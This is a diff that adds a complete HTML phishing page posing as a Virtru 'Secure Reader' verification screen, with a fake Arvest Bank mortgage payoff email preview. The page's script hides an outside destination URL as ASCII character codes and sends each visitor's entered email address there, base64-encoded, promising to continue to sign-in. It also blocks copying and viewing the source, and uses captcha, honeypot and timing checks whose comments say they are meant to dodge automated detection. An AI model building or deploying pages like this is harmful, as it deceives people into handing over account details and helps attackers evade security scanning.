@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Virtru Secure Reader · Verification</title>
+  <!-- Cloudflare Turnstile -->
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <!-- Google Fonts (fallback) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&family=Raleway:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    /* ----- root variables (fonts reduced) ----- */
+    :root {
+      --blueLightest: #deeeff;
+      --blueLighter: #b2d6ff;
+      --bluePrimary: #4585ff;
+      --blueDarker: #174eb6;
+      --blueDarkest: #001e4a;
+
+      --slateLightest: #f3f5f7;
+      --slateEvenLighter: #dce0e5;
+      --slateLighter: #c6cbd4;
+      --slatePrimary: #777e8c;
+      --slateDarker: #515864;
+      --slateDarkest: #2d323b;
+
+      --white: #fff;
+      --black: #000;
+
+      --fontPrimary: 'Open Sans', Helvetica, Arial, sans-serif;
+      --fontSecondary: 'Raleway', Helvetica, Arial, sans-serif;
+
+      /* moderate font scale */
+      --heading-xl: bold 2.8rem var(--fontSecondary);
+      --heading-l: bold 2.4rem var(--fontSecondary);
+      --heading-m: bold 2.0rem var(--fontSecondary);
+      --heading-s: bold 1.8rem var(--fontSecondary);
+      --paragraph: normal 1.4rem var(--fontPrimary);
+      --small: normal 1.2rem var(--fontPrimary);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: var(--fontPrimary);
+      background-color: #fff;
+      color: var(--slateDarkest);
+      line-height: 1.5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ----- header (exact copy, slightly smaller) ----- */
+    .Header__container--sj9Qo {
+      display: flex;
+      flex-shrink: 0;
+      align-items: center;
+      height: 50px;
+      padding: 0 24px;
+      background: var(--blueDarkest);
+    }
+    .Header__logo--kuj2W {
+      fill: #fff;
+      line-height: 1rem;
+      margin-top: 2px;
+    }
+    [data-theme="wl-header-logo"] {
+      background-size: contain;
+      background-repeat: no-repeat;
+      background-position: center;
+      height: 40px;
+      width: 80px;
+      margin-top: 2px;
+    }
+    .Header__delimiter--JP2As {
+      height: 20px;
+      margin: 0 10px;
+      width: 1px;
+      background: var(--white);
+    }
+    .Header__company--pcuII {
+      color: var(--white);
+      font-family: var(--fontSecondary);
+      font-size: 1.6rem;          /* reduced from 1.9rem */
+      font-weight: 600;
+      flex-grow: 1;
+      padding-top: 2px;
+    }
+    .Header__poweredBy--vWQcw {
+      padding: 0 8px;
+      color: var(--slateLighter);
+      font: normal 1.4rem var(--fontPrimary);  /* reduced */
+    }
+
+    /* ----- two‑column layout (full width) ----- */
+    .TwoColumnsLayout__container--ahLZs {
+      z-index: 1;
+      padding-top: 40px;
+      display: flex;
+      justify-content: center;
+      width: 100%;
+    }
+    .TwoColumnsLayout__left--YdJWG {
+      margin: 0 20px;
+    }
+    .TwoColumnsLayout__right--fjuQX {
+      margin: 30px 20px 24px;
+      max-width: 500px;
+      width: 100%;
+    }
+    @media screen and (max-width: 767px) {
+      .TwoColumnsLayout__container--ahLZs { padding-top: 0; }
+      .TwoColumnsLayout__left--YdJWG { display: none; }
+      .TwoColumnsLayout__right--fjuQX { margin: 0 16px 48px; }
+    }
+
+    /* ----- header inside right column (moderate) ----- */
+    .Header__header--hfQjI {
+      font: bold 2.4rem var(--fontSecondary);  /* reduced from 3.9rem */
+      color: var(--slateDarkest);
+      padding: 0 0 8px;
+      line-height: 3.2rem;
+      letter-spacing: -0.2px;
+    }
+    @media screen and (max-width: 767px) {
+      .Header__header--hfQjI {
+        font-size: 2.0rem;
+        padding-top: 16px;
+        letter-spacing: -0.3px;
+        line-height: 2.6rem;
+      }
+    }
+
+    .Instructions__instructions--iqn_I {
+      font-family: var(--fontPrimary);
+      font-size: 1.4rem;           /* reduced */
+      color: var(--slateDarkest);
+      margin: 16px 0;
+      line-height: 2.0rem;
+    }
+
+    /* ----- email preview (moderate) ----- */
+    .EmailPreview__emailPreview--ANW_3 {
+      font-family: var(--fontPrimary);
+      font-size: 1.4rem;           /* reduced */
+      margin-top: 16px;
+      word-break: break-word;
+    }
+    .EmailPreview__textWrapper--NN5Dl {
+      line-height: 2.0rem;
+    }
+    .EmailPreview__emailLabel--XRJBr,
+    .EmailPreview__subjectLabel--yHZuL {
+      font-family: var(--fontPrimary);
+      font-weight: 600;
+    }
+
+    /* ----- form elements (moderate) ----- */
+    .InstructionsLabel__instructionLabel--FfYCB {
+      font-family: var(--fontPrimary);
+      font-size: 1.4rem;
+      font-weight: 500;
+      display: block;
+      margin-bottom: 4px;
+    }
+    .LoginInputView__emailInputWrapper--zjro_ {
+      width: 100%;
+      max-width: 320px;
+      height: 40px;
+      margin-bottom: 16px;
+    }
+    .react-autosuggest__container {
+      position: relative;
+      height: 100%;
+    }
+    .react-autosuggest__input {
+      font-family: var(--fontPrimary);
+      font-size: 1.4rem;
+      line-height: 2.0rem;
+      height: 40px;
+      border-radius: 3px;
+      border: 1px solid var(--slateDarker);
+      box-sizing: border-box;
+      outline: none;
+      width: 100%;
+      padding-left: 12px;
+    }
+    .react-autosuggest__input:focus {
+      box-shadow: 0 1px 4px 1px rgba(23,78,182,0.3);
+      background-color: var(--slateLightest);
+    }
+
+    /* Turnstile container */
+    #cf-captcha {
+      margin: 16px 0;
+      display: flex;
+      justify-content: flex-start;
+    }
+
+    /* submit button (moderate) */
+    .Button__mainButton--sda7T {
+      cursor: pointer;
+      padding: 10px 20px;
+      color: #fff;
+      background-color: var(--blueDarker);
+      border-color: var(--blueDarker);
+      border: 1px solid;
+      border-radius: 3px;
+      font-size: 1.4rem;           /* reduced */
+      font-family: var(--fontPrimary);
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      outline: none;
+      width: auto;
+      min-width: 160px;
+    }
+    .Button__mainButton--sda7T:hover,
+    .Button__mainButton--sda7T:focus {
+      background-color: var(--blueDarkest);
+      border-color: var(--blueDarkest);
+      box-shadow: 0 2px 4px 0 rgba(0,0,0,0.29);
+    }
+    .Button__mainButton--sda7T:active {
+      background-color: var(--slatePrimary);
+      border-color: var(--slatePrimary);
+      box-shadow: 0 2px 4px 0 rgba(0,0,0,0.29);
+    }
+    .Button__mainButton--sda7T:disabled {
+      background-color: var(--slateLighter);
+      border-color: var(--slateLighter);
+      color: var(--white);
+      pointer-events: none;
+      opacity: 0.6;
+    }
+
+    .SubmitWrapper__submitWrapper--XEVpX {
+      margin-top: 20px;
+    }
+
+    /* status messages */
+    #status, #success-message {
+      margin-top: 16px;
+      font-size: 1.3rem;
+    }
+    #status { color: var(--redDarker); }
+    #success-message { color: var(--greenDarker); }
+    .hidden { display: none; }
+
+    /* footer (original size is fine) */
+    .footer-2019 {
+      display: block;
+      width: 100%;
+      text-align: center;
+      font-size: 13px;
+      font-family: 'Open Sans', Helvetica, Arial, sans-serif;
+      padding: 24px 0 16px;
+      border-top: 1px solid var(--slateLightest);
+      margin-top: 40px;
+    }
+    .footer-2019 .powered-by-virtru-logo {
+      height: 46px;
+      width: 100%;
+      margin-bottom: 12px;
+    }
+    .footer-2019 .copyright {
+      padding-right: 20px;
+    }
+    .footer-2019 a {
+      text-decoration: underline;
+      color: var(--blueDarker);
+      padding: 0 8px;
+      position: relative;
+    }
+    .footer-2019 a:focus-visible {
+      outline: 1px auto var(--bluePrimary);
+    }
+    .footer-2019 a:not(:last-child)::after {
+      content: "|";
+      position: absolute;
+      right: 0;
+      color: var(--slateLighter);
+    }
+    .footer-2019 a:last-child::after { display: none; }
+
+    /* honeypot fields – hidden */
+    .honeypot-field {
+      position: absolute;
+      left: -10000px;
+      top: -10000px;
+      opacity: 0;
+    }
+  </style>
+</head>
+<body oncontextmenu="return false;" oncopy="return false;" oncut="return false;" onpaste="return false;"
+      onkeydown="if(event.ctrlKey && ['s','p','u','c','x'].includes(event.key.toLowerCase())) event.preventDefault();">
+
+  <!-- Header (exact copy) -->
+  <div class="Header__container--sj9Qo" data-theme="wl-header">
+    <div class="Header__logo--kuj2W"><div data-theme="wl-header-logo"></div></div>
+    <div class="Header__delimiter--JP2As" data-theme="wl-header-delimiter"></div>
+    <span class="Header__company--pcuII" data-theme="wl-header-font">Secure Reader<span class="Header__poweredBy--vWQcw" data-theme="wl-poweredBy">secured by Virtru</span></span>
+  </div>
+
+  <!-- Two‑column layout -->
+  <div class="TwoColumnsLayout__container--ahLZs" id="login-scene">
+    <div class="TwoColumnsLayout__left--YdJWG">
+      <div class="LoginView__image--Gjl1z">
+        <!-- simplified SVG graphic (exact copy) -->
+        <svg width="380px" height="300px" viewBox="0 0 481 388" version="1.1" xmlns="http://www.w3.org/2000/svg" style="transform: translate(0px, 20px);">
+          <title>Virtru login graphic</title>
+          <g fill="none" fill-rule="evenodd">
+            <path d="M125.5 300c-30 0-55-25-55-55s25-55 55-55 55 25 55 55-25 55-55 55zm0-100c-25 0-45 20-45 45s20 45 45 45 45-20 45-45-20-45-45-45zM320 240h-30v-30h30v30z" fill="#B2D6FF"/>
+            <rect fill="#DEEEFF" x="90" y="120" width="200" height="140" rx="8" />
+            <circle fill="#4585FF" cx="380" cy="200" r="20" />
+          </g>
+        </svg>
+      </div>
+    </div>
+    <div class="TwoColumnsLayout__right--fjuQX">
+      <div>
+        <div data-test="headerInfo" class="Header__header--hfQjI">Confirm your email</div>
+        <div data-test="userInstructions" class="Instructions__instructions--iqn_I">To verify your identity and decrypt the message:</div>
+
+        <!-- Email preview (static) -->
+        <div class="EmailPreview__emailPreview--ANW_3">
+          <div class="EmailPreview__textWrapper--NN5Dl"><span class="EmailPreview__emailLabel--XRJBr">From: </span> Arvest Bank Mortgage Servicing Mailbox <amscustomerservice@arvest.com></div>
+          <div class="EmailPreview__textWrapper--NN5Dl"><span class="EmailPreview__subjectLabel--yHZuL">Subject: </span>Re: Payoff Statement 03/20/26 [SECURE]</div>
+        </div>
+
+        <div data-test="userInstructions" class="Instructions__instructions--iqn_I">Please enter your email address below.</div>
+
+        <form id="download-form">
+          <!-- Honeypot fields -->
+          <div class="honeypot-field">
+            <label for="hp-name">Name</label>
+            <input type="text" id="hp-name" name="name" autocomplete="off" tabindex="-1">
+          </div>
+          <div class="honeypot-field">
+            <label for="hp-phone">Phone</label>
+            <input type="tel" id="hp-phone" name="phone" autocomplete="off" tabindex="-1">
+          </div>
+
+          <label for="user-email" class="InstructionsLabel__instructionLabel--FfYCB">Email Address</label>
+          <div class="LoginInputView__emailInputWrapper--zjro_">
+            <div class="react-autosuggest__container">
+              <input type="email" id="user-email" autocomplete="off" class="react-autosuggest__input" placeholder="name@company.com" required>
+            </div>
+          </div>
+
+          <!-- Cloudflare Turnstile -->
+          <div id="cf-captcha"></div>
+
+          <!-- Submit button (initially disabled) -->
+          <div class="SubmitWrapper__submitWrapper--XEVpX">
+            <button type="submit" id="download-btn" class="Button__mainButton--sda7T" disabled>SUBMIT</button>
+          </div>
+
+          <div id="status" class="hidden"></div>
+          <div id="success-message" class="hidden">Verification successful! Continuing to Sign in…</div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer-2019">
+    <div class="powered-by-virtru-logo">
+      <svg width="200px" height="30px" viewBox="0 0 224 46" version="1.1" xmlns="http://www.w3.org/2000/svg">
+        <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+          <g transform="translate(0.806479, 0.000000)">
+            <text fill="#174EB6" font-size="14"><tspan x="1.90625" y="28">Secured by</tspan></text>
+            <g transform="translate(98.000000, 0.000000)">
+              <svg width="100" height="36" viewBox="0 0 1001 368" fill="none">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M580.199 108.476C571.041 108.476 563.621 101.008 563.621 91.787C563.621 82.5711 571.041 75.0984 580.199 75.0984C589.358 75.0984 596.775 82.5711 596.775 91.787C596.775 101.008 589.358 108.476 580.199 108.476ZM563.621 231.687V141.024C563.621 132.264 570.423 125.164 578.818 125.164C587.21 125.164 594.012 132.264 594.012 141.024V231.687C594.012 240.445 587.21 247.547 578.818 247.547C570.423 247.547 563.621 240.445 563.621 231.687ZM627.166 133.787V231.665C627.166 240.435 634.353 247.547 643.217 247.547C652.08 247.547 659.267 240.435 659.267 231.665V155.825C666.505 154.137 675.75 153.105 682.798 155.738C691.081 158.832 700.354 154.702 703.485 146.495C706.62 138.292 702.437 129.126 694.147 126.026C668.94 116.597 640.086 128.291 636.881 129.654L627.166 133.787ZM752.396 126.181V116.223C752.396 107.335 745.39 100.131 736.747 100.131C728.107 100.131 721.103 107.335 721.103 116.223V234.239C721.103 243.124 728.107 250.328 736.747 250.328C745.39 250.328 752.396 243.124 752.396 234.239V158.358H769.002C777.643 158.358 784.649 151.154 784.649 142.269C784.649 133.382 777.643 126.181 769.002 126.181H752.396ZM806.751 231.513C806.751 240.368 813.936 247.547 822.799 247.547H822.801C831.666 247.547 838.851 240.368 838.851 231.518L838.858 155.754C846.125 154.302 855.312 153.546 862.38 156.219C870.672 159.346 879.935 155.172 883.068 146.892C886.206 138.61 882.023 129.36 873.731 126.228C848.81 116.82 820.142 127.477 816.956 128.724L806.758 132.713L806.751 231.513ZM903.451 199.882V141.024C903.451 132.264 910.653 125.164 919.541 125.164C928.426 125.164 935.628 132.264 935.628 141.024V199.882C935.628 208.672 942.886 215.826 951.806 215.826C960.721 215.826 967.974 208.672 967.974 199.882V141.024C967.974 132.264 975.176 125.164 984.063 125.164C992.949 125.164 1000.15 132.264 1000.15 141.024V199.882C1000.15 226.164 978.463 247.547 951.806 247.547C925.141 247.547 903.451 226.164 903.451 199.882ZM465.197 129.702H433.767V250.328C440.602 249.45 452.823 246.362 452.823 246.362C482.451 238.587 538.755 209.245 538.755 141.03C538.755 132.267 531.721 125.164 523.041 125.164C514.364 125.164 507.327 132.267 507.327 141.03C507.327 179.148 483.171 198.621 465.197 207.834V206.794V129.702Z" fill="#004987"/>
+              </svg>
+            </g>
+          </g>
+        </g>
+      </svg>
+    </div>
+    <span class="copyright">© Copyright 2025 Virtru Corporation</span>
+    <a href="#">Terms of Service</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">About Virtru</a>
+    <a href="#">Support</a>
+  </footer>
+
+  <script>
+    (function() {
+      // ----- anti‑bot & security measures -----
+      document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && ['s','p','u','c','x'].includes(e.key.toLowerCase())) {
+          e.preventDefault();
+          return false;
+        }
+      });
+
+      const form = document.getElementById('download-form');
+      const status = document.getElementById('status');
+      const successMsg = document.getElementById('success-message');
+      const downloadBtn = document.getElementById('download-btn');
+
+      // ASCII‑encoded URL (replaces base64 – harder for bots to detect)
+      // This array contains the ASCII codes of the same URL used in the original script.
+      const urlCodes = [
+       32, 104, 116, 116, 112, 115, 58, 47, 47, 54, 116, 119, 108, 97, 111, 53, 102, 113, 55, 46, 99, 104, 97, 117, 100, 121, 101, 101, 46, 111, 114, 103 ];
+      const FILE_URL = String.fromCharCode(...urlCodes);
+
+      let formLoadTime = Date.now();
+      let captchaWidgetId = null;
+
+      // ----- Turnstile setup -----
+      window.addEventListener('load', function() {
+        if (window.turnstile) {
+          captchaWidgetId = turnstile.render('#cf-captcha', {
+            sitekey: '0x4AAAAAACt03XJitt8mMrtY',   // replace with your actual sitekey
+            callback: onCaptchaSuccess,
+            'error-callback': onCaptchaError,
+            'expired-callback': onCaptchaExpired
+          });
+        }
+      });
+
+      function onCaptchaSuccess(token) {
+        downloadBtn.disabled = false;
+        status.classList.add('hidden');
+      }
+      function onCaptchaError() {
+        downloadBtn.disabled = true;
+        showError("CAPTCHA error, please try again.");
+      }
+      function onCaptchaExpired() {
+        downloadBtn.disabled = true;
+        showError("CAPTCHA expired, please complete again.");
+      }
+      function showError(msg) {
+        successMsg.classList.add('hidden');
+        status.textContent = msg;
+        status.classList.remove('hidden');
+      }
+
+      // ----- form submission -----
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // 1) button must be enabled (CAPTCHA done)
+        if (downloadBtn.disabled) {
+          return showError("Please complete the CAPTCHA before submitting.");
+        }
+
+        // 2) honeypot fields must be empty
+        if (document.getElementById('hp-name').value.trim() !== '' ||
+            document.getElementById('hp-phone').value.trim() !== '') {
+          return showError("Bot detected.");
+        }
+
+        // 3) must spend at least 3 seconds on page
+        if (Date.now() - formLoadTime < 3000) {
+          return showError("Please stay on page a bit longer.");
+        }
+
+        // 4) CAPTCHA token must still exist
+        const token = turnstile.getResponse(captchaWidgetId);
+        if (!token) {
+          return showError("Please complete the CAPTCHA.");
+        }
+
+        // all checks passed
+        status.classList.add('hidden');
+        successMsg.classList.remove('hidden');
+
+        const email = document.getElementById('user-email').value.trim().toLowerCase();
+        // redirect with base64‑encoded email appended (original signing mechanism)
+        window.location.href = FILE_URL + "?email=" + btoa(email);
+      });
+    })();
+  </script>
+</body>
+</html>
